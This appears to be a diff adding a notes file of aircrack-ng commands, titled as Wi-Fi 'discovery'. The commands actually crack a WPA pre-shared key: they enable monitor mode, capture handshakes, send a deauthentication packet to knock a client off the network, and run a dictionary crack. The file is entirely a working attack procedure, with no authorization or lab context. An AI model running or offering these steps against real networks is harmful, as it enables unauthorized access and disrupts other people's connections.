@@ -1,0 +1,22 @@
+#instructions for wifi discovery
+
+#find wifi nics
+iwlist
+
+# find ssids, assumed here as xx:xx:xx:xx:xx:xx
+iwlist scanning
+
+#stop nic
+airmon-ng stop wlan0
+
+#set nic to monitor
+airmon-ng start wlan0 9
+
+#capture auths to files psk*
+airodump-ng -c 9 --bssid xx:xx:xx:xx:xx:xx -w psk mon0
+
+#if auths are too slow disconect client y to force a new auth
+aireplay-ng -0 1 -a xx:xx:xx:xx:xx:xx -c yy:yy:yy:yy:yy:yy mon0
+
+#crack the psk
+aircrack-ng -w rainbowtables.lst -b xx:xx:xx:xx:xx:xx psk*.cap
